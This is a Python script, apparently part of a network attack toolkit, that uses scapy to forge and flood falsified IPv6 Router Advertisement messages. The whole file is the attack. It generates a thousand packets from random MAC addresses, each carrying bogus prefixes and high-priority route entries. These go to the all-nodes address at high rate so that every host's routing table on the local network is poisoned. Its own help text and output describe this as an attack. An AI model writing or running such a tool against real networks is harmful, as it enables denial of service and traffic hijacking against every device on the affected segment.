#!/usr/bin/python3
import argparse
import random
import sys

import netifaces
import psutil
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptMTU, ICMPv6NDOptPrefixInfo, fragment6, \
    ICMPv6NDOptRouteInfo, ICMPv6NDOptSrcLLAddr
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendpfast

from validate_parameters import mac2ipv6


def main():
    parser = argparse.ArgumentParser(description="Flooding and poisoning the routing entries of specified hosts with "
                                                 "falsified Router Advertisement messages.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Setting the parameter
    stats = psutil.net_if_stats()
    mtu = stats.get(args.interface).mtu

    pkt_list = []
    for i in range(1000):
        random_mac = "02:01:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                  random.randint(0, 255),
                                                  random.randint(0, 255))
        source_ip = mac2ipv6(random_mac)
        destination_ip = "ff02::1"
        packet1 = Ether(src=random_mac) / IPv6(src=source_ip, dst=destination_ip) / ICMPv6ND_RA(prf="High", routerlifetime=65535, reachabletime=3145728,  retranstimer=1966080) / ICMPv6NDOptSrcLLAddr(lladdr=random_mac) / ICMPv6NDOptMTU(mtu=mtu)
        num_prefixRecord = 7
        network = ':'.join('{:x}'.format(random.randint(0, 2 ** 16 - 1)) for i in range(2))
        network = "2001:dead:" + network + "::"
        Opt_PrefixInfo = ICMPv6NDOptPrefixInfo(prefixlen=64, A=1, prefix=network)
        packet1 /= Opt_PrefixInfo
        for j in range(num_prefixRecord):
            network = ':'.join('{:x}'.format(random.randint(0, 2 ** 16 - 1)) for i in range(2))
            network = "2001:dead:" + network + "::"
            packet1 /= ICMPv6NDOptPrefixInfo(prefixlen=64, A=1, prefix=network)

        num_routeInfo = 4
        for m in range(num_routeInfo):
            network = ':'.join('{:x}'.format(random.randint(0, 2 ** 16 - 1)) for i in range(2))
            network = "2004:bad:" + network + "::"
            packet1 /= ICMPv6NDOptRouteInfo(plen=64, prf="High", prefix=network)

        pkt_list.append(packet1)
    print("Flooding and poisoning the routing entries of target with falsified Router Advertisement messages (press "
          "Ctrl+C to stop the attack).....")
    try:
        sendpfast(pkt_list, mbps=20000, loop=5000000, iface=args.interface)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()